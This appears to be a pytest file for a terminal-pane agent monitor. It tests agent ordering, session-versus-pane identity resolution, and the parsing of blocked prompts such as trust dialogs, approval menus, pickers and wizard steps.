    assert [a.target for a in s.agents] == ["w1:p4", "w1:p1", "w1:p3", "w1:p2"]


def test_agents_that_never_changed_tie_and_fall_back_to_position() -> None:
    """Seq 0 is "no reported change", not "changed at time zero" -- it sorts last."""
    s = _by_seq(("w1:p9", "idle", 0), ("w1:p2", "idle", 0), ("w1:p5", "idle", 3))
    assert [a.target for a in s.agents] == ["w1:p5", "w1:p2", "w1:p9"]


def test_a_poll_that_changes_nothing_leaves_the_key_untouched() -> None:
    """``revision`` moves every tick under the feed's re-poll, and the order must not move with it."""
    before = _by_seq(("w1:p1", "idle", 4), ("w1:p9", "idle", 91))
    keys = [a.sort_key for a in before.agents]
    busier = [a.model_copy(update={"revision": a.revision + 17}) for a in before.agents]
    assert [a.sort_key for a in busier] == keys


def test_the_urgency_is_the_only_term_a_caller_may_replace() -> None:
    """The feed re-sorts with a corrected rank this module cannot compute, since it depends on the seen ledger."""
    one = _by_seq(("w1:p1", "done", 4)).agents[0]
    assert one.feed_key() == one.sort_key
    demoted = one.feed_key(rank(AgentStatus.IDLE))
    assert demoted[0] == rank(AgentStatus.IDLE) != one.sort_key[0]
    assert demoted[1:] == one.sort_key[1:]


def test_sort_is_stable_across_every_input_permutation(raw_snapshot: dict[str, JsonValue]) -> None:
    """Determinism means one canonical order, not just "reversal is a no-op"."""
    expected = [a.target for a in Snapshot.from_raw(raw_snapshot).agents]
    for permutation in itertools.permutations(_agents(raw_snapshot)):
        s = Snapshot.from_raw(_with(raw_snapshot, "agents", permutation))
        assert [a.target for a in s.agents] == expected
        assert [a.session for a in s.agents] == [
            a.session for a in Snapshot.from_raw(raw_snapshot).agents
        ]


# identity vs address, and reconciliation
SESSION_A = SessionId("5e550001-0000-0000-0000-000000000000")
SESSION_B = SessionId("22222222-2222-4222-8222-222222222222")


def _two_agents(a_pane: str, b_pane: str) -> Snapshot:
    """Two known agents, each pinned to whichever pane is passed in."""
    return Snapshot.from_raw(
        {
            "protocol": EXPECTED_PROTOCOL,
            "agents": [
                {
                    "pane_id": a_pane,
                    "agent_status": "idle",
                    "agent_session": {"value": SESSION_A, "agent": "claude"},
                    "terminal_title_stripped": "agent A",
                    "cwd": "/home/user/projects/alpha",
                },
                {
                    "pane_id": b_pane,
                    "agent_status": "idle",
                    "agent_session": {"value": SESSION_B, "agent": "claude"},
                    "terminal_title_stripped": "agent B",
                    "cwd": "/home/user/projects/beta",
                },
            ],
            "workspaces": [],
        }
    )


def test_agents_that_swap_panes_are_still_told_apart_by_session() -> None:
    """Identity and address resolved together, in one test."""
    before = _two_agents("w1:p1", "w1:p3")
    after = _two_agents("w1:p3", "w1:p1")  # they traded addresses

    a_before, a_after = before.by_session(SESSION_A), after.by_session(SESSION_A)
    assert a_before is not None
    assert a_after is not None
    assert a_before.title == a_after.title == "agent A"
    assert a_before.target != a_after.target  # ...at a new address

    # The same lookup by address quietly returns the *other* agent.
    stale = after.by_target(PaneId("w1:p1"))
    assert stale is not None
    assert stale.title == "agent B"


def test_a_sessionless_agent_never_answers_an_identity_lookup() -> None:
    s = Snapshot.from_raw(
        {
            "protocol": EXPECTED_PROTOCOL,
            "agents": [
                {"pane_id": "w1:p1", "agent_status": "blocked"},
                {
                    "pane_id": "w1:p3",
                    "agent_status": "idle",
                    "agent_session": {"value": SESSION_A},
                },
            ],
            "workspaces": [],
        }
    )
    assert s.by_session(SessionId("")) is None
    assert s.by_session(SessionId("  ")) is None
    assert s.by_session(SESSION_B) is None  # a real UUID that is simply not here
    found = s.by_session(SESSION_A)
    assert found is not None
    assert found.target == "w1:p3"
    # ...and the sessionless one is still addressable, because it still exists.
    assert s.by_target(PaneId("w1:p1")) is not None


def test_an_address_cannot_be_passed_where_an_identity_is_meant() -> None:
    """An address passed as an identity is caught at runtime as well as by pyright."""
    s = _two_agents("w1:p1", "w1:p3")
    with pytest.raises(ValueError, match="pane id"):
        s.by_session(SessionId("w1:p3"))
    with pytest.raises(ValueError, match="pane id"):
        as_session_id("w1:p3")
    # ...and the reverse: a remembered identity is not an address to drive.
    with pytest.raises(ValueError, match="session id"):
        s.by_target(PaneId(SESSION_A))
    with pytest.raises(ValueError, match="session id"):
        as_pane_id(SESSION_A)
    # The doors themselves accept the right kind and normalize whitespace.
    assert as_session_id(f"  {SESSION_A} ") == SESSION_A
    assert as_pane_id(" w1:p3 ") == "w1:p3"


def test_resolve_session_reports_an_agent_that_stayed_put() -> None:
    s = _two_agents("w1:p1", "w1:p3")
    r = s.resolve_session(SESSION_A, expected_target=PaneId("w1:p1"))
    assert r.presence is Presence.HERE
    assert r.ok is True
    assert r.target == "w1:p1"
    assert r.agent is not None
    assert r.agent.title == "agent A"
    assert r.occupant is None  # the occupant *is* the agent; not worth reporting
    assert r.message == ""


def test_resolve_session_detects_the_pane_moving_underneath() -> None:
    """A drill-in opened on w1:p1 minutes ago must be told the agent moved."""
    s = _two_agents("w2:p7", "w1:p3")
    r = s.resolve_session(SESSION_A, expected_target=PaneId("w1:p1"))
    assert r.presence is Presence.MOVED
    assert r.ok is False
    assert r.agent is not None
    assert r.agent.title == "agent A"
    assert r.target == "w2:p7"  # drive the new address, never the remembered one
    assert r.expected_target == "w1:p1"
    assert r.occupant is None  # nobody took the old pane
    assert "moved" in r.message
    assert "w2:p7" in r.message


def test_resolve_session_names_the_stranger_now_holding_the_pane() -> None:
    """The notification case: tapped ten minutes late, the pane is recycled."""
    s = _two_agents("w2:p7", "w1:p1")  # agent B moved into A's old pane
    r = s.resolve_session(SESSION_A, expected_target=PaneId("w1:p1"))
    assert r.presence is Presence.MOVED
    assert r.occupant is not None
    assert r.occupant.title == "agent B"
    assert r.occupant.session == SESSION_B
    assert r.target == "w2:p7"


def test_resolve_session_reports_a_gone_agent_instead_of_driving_the_pane() -> None:
    s = _two_agents("w1:p1", "w1:p3")
    r = s.resolve_session(SESSION_B, expected_target=PaneId("w1:p3"))
    assert r.presence is Presence.HERE  # sanity: B is alive at w1:p3

    closed = Snapshot.from_raw(
        {
            "protocol": EXPECTED_PROTOCOL,
            "agents": [
                {
                    "pane_id": "w1:p3",  # same pane, brand new agent
                    "agent_status": "working",
                    "agent_session": {"value": SESSION_A},
                    "terminal_title_stripped": "agent A",
                }
            ],
            "workspaces": [],
        }
    )
    gone = closed.resolve_session(SESSION_B, expected_target=PaneId("w1:p3"))
    assert gone.presence is Presence.GONE
    assert gone.ok is False
    assert gone.agent is None
    assert gone.target is None, "nothing to drive — the identity is not here"
    assert gone.occupant is not None
    assert gone.occupant.session == SESSION_A
    assert "gone" in gone.message.lower()
    assert "different agent" in gone.message


def test_resolve_session_without_a_remembered_address() -> None:
    # A card key carries only the identity: alive is all there is to check.
    s = _two_agents("w1:p1", "w1:p3")
    assert s.resolve_session(SESSION_A).presence is Presence.HERE
    missing = s.resolve_session(SessionId("33333333-3333-4333-8333-333333333333"))
    assert missing.presence is Presence.GONE
    assert missing.occupant is None
    assert missing.message == "This agent is gone."


def test_resolve_session_on_a_sessionless_lookup_is_gone_not_a_match() -> None:
    s = _two_agents("w1:p1", "w1:p3")
    assert s.resolve_session(SessionId("")).presence is Presence.GONE


def test_a_resolution_is_frozen() -> None:
    r = _two_agents("w1:p1", "w1:p3").resolve_session(SESSION_A)
    with pytest.raises(ValidationError):
        r.presence = Presence.GONE


def test_the_session_is_usable_as_a_transcript_filename(snap: Snapshot) -> None:
    """The transcript reader opens a file named <session>.jsonl; keep that possible."""
    for a in snap.agents:
        assert re.fullmatch(r"[0-9a-f]{8}(-[0-9a-f]{4}){3}-[0-9a-f]{12}", a.session)
        assert f"{a.session}.jsonl".count("/") == 0


def test_an_agent_with_no_pane_id_is_not_reachable_by_the_empty_address() -> None:
    """The address twin of the sessionless bug: "" must never match anybody."""
    s = Snapshot.from_raw(
        {
            "protocol": EXPECTED_PROTOCOL,
            "agents": [
                {"agent_status": "idle", "agent_session": {"value": SESSION_A}},
                {"pane_id": "w1:p3", "agent_status": "idle"},
            ],
            "workspaces": [],
        }
    )
    assert [a.target for a in s.agents] == ["", "w1:p3"]
    assert s.by_target(PaneId("")) is None
    assert s.by_target(PaneId("   ")) is None
    # The sessionless one is still resolvable by identity, which is the point.
    found = s.by_session(SESSION_A)
    assert found is not None
    assert found.target == ""


# BlockedPrompt: chrome under the question

# The lookback may step over chrome to an earlier question, but never past the rule or too far back.

TRUST_DIALOG = (
    "──────────────────────────────────────────\n"
    " Accessing workspace:\n"
    "\n"
    " /home/user/probe\n"
    "\n"
    " Quick safety check: Is this a project you created or one you trust?\n"
    "\n"
    " Claude Code'll be able to read, edit, and execute files here.\n"
    "\n"
    " Security guide\n"
    "\n"
    "\u276f 1. Yes, I trust this folder\n"
    "  2. No, exit\n"
    "\n"
    "Enter to confirm · Esc to cancel\n"
)


def test_chrome_under_the_question_is_stepped_over() -> None:
    p = BlockedPrompt.parse(TRUST_DIALOG)
    assert p.is_choice is True
    assert p.question == ("Quick safety check: Is this a project you created or one you trust?")


def test_stepping_over_chrome_never_merges_it_into_the_question() -> None:
    # Skipped chrome is dropped from the question, not glued to it; it stays in `raw`.
    p = BlockedPrompt.parse(TRUST_DIALOG)
    assert "Security guide" not in p.question
    assert "execute files here" not in p.question
    assert "Security guide" in p.raw


def test_a_question_without_a_question_mark_keeps_the_adjacent_paragraph() -> None:
    # Nothing in reach asks anything, so the paragraph nearest the buttons stands.
    text = "Choose how to proceed\n\nPick carefully.\n\n1. Merge\n2. Rebase\n"
    p = BlockedPrompt.parse(text)
    assert p.question == "Pick carefully."


def test_the_question_search_never_leaves_the_current_dialog_box() -> None:
    # The rule at the top of the box is a hard boundary against transcript question marks.
    text = (
        "\u276f Should I force-push to main?\n"
        "\n"
        "──────────────────────────────\n"
        " Bash command\n"
        "\n"
        " This command requires approval\n"
        "\n"
        "1. Yes\n"
        "2. No\n"
    )
    p = BlockedPrompt.parse(text)
    assert p.question == "This command requires approval"


def test_the_question_search_gives_up_after_a_few_paragraphs() -> None:
    # Bounded lookback: a stray "?" under a stack of chrome is not evidence.
    text = "Did the deploy finish?\n\none\n\ntwo\n\nthree\n\nfour\n\n1. Yes\n2. No\n"
    p = BlockedPrompt.parse(text)
    assert p.question == "four"


def test_a_dashed_diff_rule_is_a_divider_not_prose() -> None:
    # The U+254C rules around a file diff are chrome, so neither they nor the diff become the question.
    text = (
        " Create file\n"
        " notes.txt\n"
        "╌" * 40 + "\n"
        "  1 hello\n" + "╌" * 40 + "\n"
        " Do you want to create notes.txt?\n"
        "\n"
        "\u276f 1. Yes\n"
        "  2. No\n"
    )
    p = BlockedPrompt.parse(text)
    assert p.question == "Do you want to create notes.txt?"
    assert [(o.number, o.label) for o in p.options] == [(1, "Yes"), (2, "No")]


def test_the_option_marker_class_still_refuses_the_response_bullet() -> None:
    # A leading U+25CF is not an option marker, so a finished recap cannot build a run; keep it out.
    recap = "● 1. README.md\n  2. pyproject.toml\n  3. src/pkg/__init__.py\n"
    p = BlockedPrompt.parse(recap)
    assert p.is_choice is False
    assert p.options == ()


# An answer is never promoted into the question

# The tail of a live menu read one line late: no `1.` above it, so no run.
OPTION_TAIL = (
    "\n".join(
        (Path(__file__).parent / "fixtures" / "capture-blocked-permission-prompt" / "detection.txt")
        .read_text(encoding="utf-8")
        .splitlines()[-3:]
    )
    + "\n"
)


def test_a_lone_option_row_from_a_real_capture_is_not_the_question() -> None:
    """The defect, measured on the bytes it was found in."""
    p = BlockedPrompt.parse(OPTION_TAIL)

    assert "3. No" in p.raw, "the capture must still end on an option row"
    assert p.options == (), "no 1..n run: this is a menu's tail, not a menu"
    assert p.question == "", "an option row is an answer; it is never the question"


def test_a_truncated_menu_says_nothing_rather_than_the_wrong_thing() -> None:
    """The end state this trades into, stated plainly: it is not a regression."""
    lines = OPTION_TAIL.splitlines()
    two_rows = BlockedPrompt.parse(
        "\n".join(
            (
                Path(__file__).parent
                / "fixtures"
                / "capture-blocked-permission-prompt"
                / "detection.txt"
            )
            .read_text(encoding="utf-8")
            .splitlines()[-4:]
        )
        + "\n"
    )

    assert len(lines) == 3
    assert two_rows.question == ""
    assert two_rows.options == ()


def test_the_whole_capture_still_reads_its_real_question() -> None:
    """The direction that would do damage if this fix went one character wider."""
    text = (
        Path(__file__).parent / "fixtures" / "capture-blocked-permission-prompt" / "detection.txt"
    ).read_text(encoding="utf-8")
    p = BlockedPrompt.parse(text)

    assert p.question == "Do you want to proceed?"
    assert [o.number for o in p.options] == [1, 2, 3]


def test_a_question_that_merely_sits_next_to_option_rows_survives() -> None:
    """The narrowness of the rule, pinned."""
    assert BlockedPrompt.parse("Next up:\n1. rerun the failing test\n").question == (
        "Next up:\n1. rerun the failing test"
    )
    recap = "● 1. README.md\n  2. pyproject.toml\n  3. src/pkg/__init__.py\n"
    assert BlockedPrompt.parse(recap).question.startswith("● 1. README.md")


def test_the_fallback_still_rescues_the_screens_it_was_written_for() -> None:
    """Why the fallback is narrowed and not deleted, in the two shapes that need it."""
    approval = (
        "\u276f Should I force-push to main?\n"
        "\n"
        "──────────────────────────────\n"
        " Bash command\n"
        "\n"
        " This command requires approval\n"
        "\n"
        "1. Yes\n"
        "2. No\n"
    )
    statement = "Choose how to proceed\n\nPick carefully.\n\n1. Merge\n2. Rebase\n"

    assert BlockedPrompt.parse(approval).question == "This command requires approval"
    assert BlockedPrompt.parse(statement).question == "Pick carefully."


# one expected protocol per view, not one per module
def test_a_snapshot_judges_itself_against_the_protocol_it_was_handed() -> None:
    """The expectation used to be the module constant, always."""
    handed = EXPECTED_PROTOCOL + 1
    raw: dict[str, JsonValue] = {"protocol": handed, "agents": [], "workspaces": []}
    assert Snapshot.from_raw(raw).expected_protocol == EXPECTED_PROTOCOL  # the build's number
    assert Snapshot.from_raw(raw, expected_protocol=handed).expected_protocol == handed


def test_an_omitted_expectation_still_means_the_build_it_was_compiled_for() -> None:
    raw: dict[str, JsonValue] = {"protocol": EXPECTED_PROTOCOL, "agents": [], "workspaces": []}
    assert Snapshot.from_raw(raw).expected_protocol == EXPECTED_PROTOCOL


def test_a_blocked_prompt_refuses_a_mixed_up_address_and_identity() -> None:
    """The tap-to-answer surface: a keystroke is one step from these two fields."""
    with pytest.raises(ValueError, match="session id"):
        BlockedPrompt.parse("q?", target=SESSION_A)  # pyright: ignore[reportArgumentType]
    with pytest.raises(ValueError, match="pane id"):
        BlockedPrompt.parse("q?", session="w1:p1")  # pyright: ignore[reportArgumentType]
    p = BlockedPrompt.parse("q?", target=as_pane_id(" w1:p1 "), session=SESSION_A)
    assert (p.target, p.session) == ("w1:p1", SESSION_A)


# A shape is earned, not defaulted to

# A settings picker whose digit would silently save a default: the trailing anchor alone must not make it a menu.
PICKER = (
    "Select model\n"
    "Switch between models. Your pick becomes the default for new sessions.\n"
    "\n"
    "\u276f 1. Default (recommended)\n"
    "  2. Opus\n"
    "  3. Sonnet\n"
    "  4. Haiku\n"
    "\n"
    "Enter to set as default · Esc to cancel\n"
)


def test_a_picker_that_asks_nothing_is_refused_however_tidy_its_rows() -> None:
    """The run is trailing, corroborated, marked -- and still not a menu."""
    p = BlockedPrompt.parse(PICKER)
    assert p.shape is MenuShape.UNKNOWN, "live, and not a menu we can drive"
    assert p.options == ()
    assert p.corroborated is True, "it IS live; that was never the question"
    assert [(h.key, h.verb) for h in p.hints] == [
        ("enter", "set as default"),
        ("esc", "cancel"),
    ], "and the keys it printed are still offered, verbs and all"


def test_the_same_picker_earns_its_rows_once_it_asks_something() -> None:
    """The control: one clause changes and the refusal lifts."""
    p = BlockedPrompt.parse(PICKER.replace("Select model\n", "Which model?\n"))
    assert p.shape is MenuShape.SINGLE_CHOICE
    assert [o.number for o in p.options] == [1, 2, 3, 4]


def test_naming_enter_as_select_earns_the_rows_with_no_question_mark() -> None:
    """The other branch, which a real capture depends on."""
    p = BlockedPrompt.parse(PICKER.replace("set as default", "select"))
    assert p.shape is MenuShape.SINGLE_CHOICE
    assert [o.number for o in p.options] == [1, 2, 3, 4]


def test_the_marker_is_required_on_every_shape_not_just_single_choice() -> None:
    """No cursor, no menu is applied in ``parse``, before any shape is judged."""
    boxes = "1. [ ] alpha\n2. [x] beta\n\nSpace to toggle · Enter to confirm\n"
    assert BlockedPrompt.parse(boxes).options == ()
    marked = BlockedPrompt.parse("\u276f " + boxes)
    assert marked.shape is MenuShape.MULTI_SELECT
    assert [o.number for o in marked.options] == [1, 2]


# A wizard step is not an answered question

# The arrows around the strip are the detection; a single question draws the same tokens without them.
WIZARD_STEP = (
    "←  ☒ Focus area  ☐ Scope  ☐ Workflow  ✔ Submit  →\n"
    "\n"
    "How should I approach the work?\n"
    "\n"
    "\u276f 1. Plan first\n"
    "     I draft a plan and get your approval first.\n"
    "  2. Just build it\n"
    "     I go straight to implementation.\n"
    "  3. Type something.\n"
    "\n"
    "Enter to select · Tab/Arrow keys to navigate · Esc to cancel\n"
)


def test_a_wizard_step_is_read_as_one_step_of_several() -> None:
    """The rows are still single-choice; the QUESTION is not over."""
    p = BlockedPrompt.parse(WIZARD_STEP)
    assert p.shape is MenuShape.SINGLE_CHOICE, "the step itself chooses one row"
    assert [o.number for o in p.options] == [1, 2, 3]
    assert p.stepper is not None
    assert p.stepper.steps == ("Focus area", "Scope", "Workflow")
    assert p.stepper.total == 3, "Submit is the strip's own step, not a question"
    assert p.stepper.answered == 1
    assert p.stepper.remaining == 2


def test_a_single_question_strip_is_not_a_stepper() -> None:
    """The control, and the reason the arrows are load-bearing."""
    single = WIZARD_STEP.replace(
        "←  ☒ Focus area  ☐ Scope  ☐ Workflow  ✔ Submit  →",
        " ☐ Approach ",
    )
    p = BlockedPrompt.parse(single)
    assert p.shape is MenuShape.SINGLE_CHOICE
    assert p.stepper is None


def test_the_step_this_is_is_never_claimed() -> None:
    """A revisited step ticks EXACTLY like the one after it -- so no index."""
    on_step_two = BlockedPrompt.parse(WIZARD_STEP)
    revisiting_step_one = BlockedPrompt.parse(
        WIZARD_STEP.replace(
            "How should I approach the work?", "Which focus area should we work on?"
        )
    )
    assert on_step_two.stepper == revisiting_step_one.stepper
    assert not hasattr(on_step_two.stepper, "index")


# claude's wizard checklist: rows, an unnumbered Next row, then a numbered row under its own rule.
WIZARD_CHECKLIST = (
    "> earlier prompt\n"
    "────────────────────────────────────────\n"
    "←  ☐ Fruit  ☐ Size  ✔ Submit  →\n"
    "\n"
    "Which fruit should go in the basket?\n"
    "\n"
    "\u276f 1. [ ] Apples\n"
    "     Crisp and sweet.\n"
    "  2. [✔] Pears\n"
    "     Soft when ripe.\n"
    "  3. [ ] Type something\n"
    "     Next\n"
    "────────────────────────────────────────\n"
    "  4. Chat about this\n"
    "\n"
    "Enter to select · Tab/Arrow keys to navigate · Esc to cancel\n"
)

PARKED_ON_NEXT = WIZARD_CHECKLIST.replace("\u276f 1. [ ]", "  1. [ ]").replace(
    "     Next", "\u276f    Next"
)


def _steps(prompt: BlockedPrompt) -> tuple[int, tuple[str, ...]] | None:
    step = prompt.stepper
    return None if step is None else (step.answered, step.steps)


def test_a_checklist_reads_the_same_wherever_the_cursor_is_parked() -> None:
    """Arrowing to the Next row moves the cursor, not the question."""
    on_a_row = BlockedPrompt.parse(WIZARD_CHECKLIST)
    on_next = BlockedPrompt.parse(PARKED_ON_NEXT)
    assert on_a_row.shape is MenuShape.MULTI_SELECT
    assert on_next.shape is MenuShape.MULTI_SELECT
    assert on_next.options == on_a_row.options
    assert [(o.number, o.checked) for o in on_next.options] == [
        (1, False),
        (2, True),
        (3, False),
        (4, None),
    ]
    assert _steps(on_next) == _steps(on_a_row) == (0, ("Fruit", "Size"))
    assert on_next.identity == on_a_row.identity, "a tap drawn before the move still lands"


def test_a_glyph_outside_the_rows_is_still_not_a_cursor_on_the_menu() -> None:
    """The control: claude marks the user's own prompt with the same glyph, above the box."""
    unparked = WIZARD_CHECKLIST.replace("\u276f 1. [ ]", "  1. [ ]")
    above = unparked.replace("> earlier prompt", "\u276f earlier prompt")
    assert BlockedPrompt.parse(above).options == ()


def test_a_quoted_line_inside_a_numbered_list_is_not_a_cursor() -> None:
    """Only a cursor glyph counts as the cursor: ``>`` is a markdown quote in a recap."""
    recap = "1. first\n> quoted aside\n2. second\n\nEnter to select · Esc to cancel\n"
    assert BlockedPrompt.parse(recap).options == ()


# The same wizard drawn with a preview panel beside the rows, so no trailing run is read.
PREVIEW_STEP = (
    "> earlier prompt\n"
    "────────────────────────────────────────\n"
    "←  ☐ Layout  ☐ Theme  ✔ Submit  →\n"
    "\n"
    "Which layout should we use?\n"
    "\n"
    "\u276f 1. Grid        ┌──────────┐\n"
    "  2. List        │ [a] [b]  │\n"
    "                 └──────────┘\n"
    "\n"
    "                 Notes: press n to add notes\n"
    "────────────────────────────────────────\n"
    "  Chat about this\n"
    "\n"
    "Enter to select · ↑/↓ to navigate · Tab to switch questions · Esc to cancel\n"
)


def test_the_strip_is_seen_when_the_rows_are_not() -> None:
    """With no run to anchor on, the strip is still the asking box's top line."""
    p = BlockedPrompt.parse(PREVIEW_STEP.replace("\u276f 1.", "  1."))
    assert p.options == ()
    assert _steps(p) == (0, ("Layout", "Theme"))


def test_rows_beside_a_preview_box_are_read_without_the_box() -> None:
    """The box, its Notes line and the unnumbered row under the rule are not part of any label."""
    p = BlockedPrompt.parse(PREVIEW_STEP)
    assert p.shape is MenuShape.SINGLE_CHOICE
    assert [(o.number, o.label) for o in p.options] == [(1, "Grid"), (2, "List")]
    assert p.question == "Which layout should we use?"
    assert _steps(p) == (0, ("Layout", "Theme"))


def test_rows_beside_a_folded_preview_are_read() -> None:
    """A tall preview is drawn folded, with a tee row across it, and the rows beside it still count."""
    folded = PREVIEW_STEP.replace(
        "  2. List        │ [a] [b]  │\n",
        "  2. List        │ [a] [b]  │\n  3. Cards       ├── ✂ ─────┤\n",
    )
    p = BlockedPrompt.parse(folded)
    assert [o.label for o in p.options] == ["Grid", "List", "Cards"]
    # Each label is whole beside the fold too, so each row is one a digit may name.
    assert all(printed_whole(p.raw, o.label) for o in p.options)


def test_an_open_note_box_leaves_the_rows_unread() -> None:
    """claude offers its editor key only while the note box holds the keys, and a digit then types."""
    footer = "Enter to select · ↑/↓ to navigate · Tab to switch questions · Esc to cancel"
    typing = PREVIEW_STEP.replace("press n to add notes", "Add notes on this design…").replace(
        "Tab to switch questions", "ctrl+g to edit in nano · Tab to switch questions"
    )
    assert footer not in typing
    assert BlockedPrompt.parse(typing).options == ()


def test_a_question_mark_in_the_transcript_is_not_the_dialog_asking() -> None:
    """The leak a LIVE probe found, and the reason the box has to be a box."""
    transcript = "How should I approach the work?\n\n● I will use the parser.\n\n"
    assert BlockedPrompt.parse(transcript + PICKER).options == ()
    # ...and the control: the same run one paragraph under the same question.
    assert BlockedPrompt.parse("How should I?\n\n\u276f 1. Yes\n  2. No\n").options


PLAN_APPROVAL = (
    "  ────────────\n"
    "   Claude has written up a plan and is ready to execute. "
    "Would you like to proceed?\n"
    "\n"
    "   \u276f 1. Yes, auto-accept edits\n"
    "     2. Yes, manually approve edits\n"
    "     3. Tell Claude what to change\n"
    "        shift+tab to approve with this feedback\n"
    "\n"
    "   ctrl+g to edit in Vim · ~/.claude/plans/some-plan.md\n"
)

SUB_LINE = "        shift+tab to approve with this feedback\n"
EDITOR_FOOTER = "   ctrl+g to edit in Vim · ~/.claude/plans/some-plan.md\n"


def test_the_plan_approval_screen_is_read_with_both_of_its_hint_lines() -> None:
    """The whole screen used to come back as ``shape=none``."""
    p = BlockedPrompt.parse(PLAN_APPROVAL)
    assert p.shape is MenuShape.SINGLE_CHOICE
    assert [o.number for o in p.options] == [1, 2, 3]
    assert p.question.endswith("Would you like to proceed?")
    # `shift+tab` has no send_keys spelling, so it must never reach a button.
    assert p.hints == ()
    # Ctrl+G opens Vim in the pane: still read, so the screen still asks, never offered.
    assert [(h.key, h.verb) for h in p.handoffs] == [("ctrl-g", "edit in vim")]
    assert p.answerable


@pytest.mark.parametrize("line", [SUB_LINE, EDITOR_FOOTER])
def test_either_hint_line_alone_used_to_be_fatal_and_no_longer_is(line: str) -> None:
    """Isolated by deletion, which is how the defect was confirmed."""
    p = BlockedPrompt.parse(PLAN_APPROVAL.replace(line, ""))
    assert p.shape is MenuShape.SINGLE_CHOICE
    assert [o.number for o in p.options] == [1, 2, 3]


@pytest.mark.parametrize(
    ("verb", "hands_off"),
    [
        ("edit in vim", True),
        ("edit in nano", True),
        ("edit in vs code", True),
        ("open editor", True),
        ("open in external editor", True),
        ("open shell", True),
        ("suspend", True),
        ("select", False),
        ("amend", False),
        ("add notes", False),
        ("edit inline", False),
        ("explain", False),
    ],
)
def test_a_hint_that_hands_the_terminal_to_another_program_is_named_by_its_verb(
    verb: str, hands_off: bool
) -> None:
    assert KeyHint(key="ctrl-g", verb=verb).hands_off is hands_off


def test_reading_chrome_by_its_key_does_not_read_prose_as_chrome() -> None:
    """The bar this could have lowered, and the reason it is a KEY test."""
    prose = "Ask the reviewer to approve the change\n"
    assert not is_key_hint(prose)
    assert is_key_hint("shift+tab to approve with this feedback")
    # A run interrupted by prose is still not a trailing run.
    interrupted = PLAN_APPROVAL.replace(SUB_LINE, "        " + prose)
    assert BlockedPrompt.parse(interrupted).options == ()
